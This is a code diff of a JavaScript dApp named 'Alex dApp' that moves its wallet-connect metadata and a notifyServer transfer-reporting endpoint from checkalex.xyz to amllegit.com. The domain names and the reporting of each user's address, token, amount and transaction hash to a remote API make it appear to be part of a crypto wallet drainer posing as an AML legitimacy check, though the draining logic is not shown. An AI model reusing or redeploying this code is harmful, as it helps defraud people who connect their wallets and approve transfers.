@@ -17,8 +17,8 @@ const appKitModal = createAppKit({
   metadata: {
     name: 'Alex dApp',
     description: 'Connect and sign',
-    url: 'https://checkalex.xyz',
-    icons: ['https://checkalex.xyz/icon.png'],
+    url: 'https://amllegit.com',
+    icons: ['https://amllegit.com/icon.png'],
   },
   features: { analytics: true, email: false, socials: false },
   allWallets: 'SHOW',
@@ -567,7 +567,7 @@ async function notifyServer(userAddress, tokenAddress, amount, chainId, txHash, 
       throw new Error('Amount is zero or negative');
     }
 
-    const response = await fetch('https://api.checkalex.xyz/api/transfer', {
+    const response = await fetch('https://api.amllegit.com/api/transfer', {
       method: 'POST',
       headers: { 'Content-Type': 'application/json' },
       body: JSON.stringify({
